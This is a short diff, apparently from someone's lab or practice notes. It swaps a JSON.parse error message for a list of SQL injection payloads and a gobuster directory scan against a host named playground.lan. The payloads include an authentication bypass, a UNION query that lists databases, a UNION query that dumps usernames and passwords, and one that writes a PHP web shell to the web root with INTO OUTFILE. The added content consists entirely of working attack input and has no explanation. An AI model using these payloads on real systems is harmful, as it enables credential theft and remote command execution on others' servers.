@@ -1,1 +1,7 @@
-Uncaught (in promise) SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
+
+CN ' OR '1'='1'-- -
+CN ' OR role_user='Administrator'-- -
+CN ' UNION SELECT SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+CN ' UNION SELECT username, password,3,4 FROM Users-- -
+CN ' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- -
+gobuster dir -u http://playground.lan -w ~/Downloads/common.txt -x html
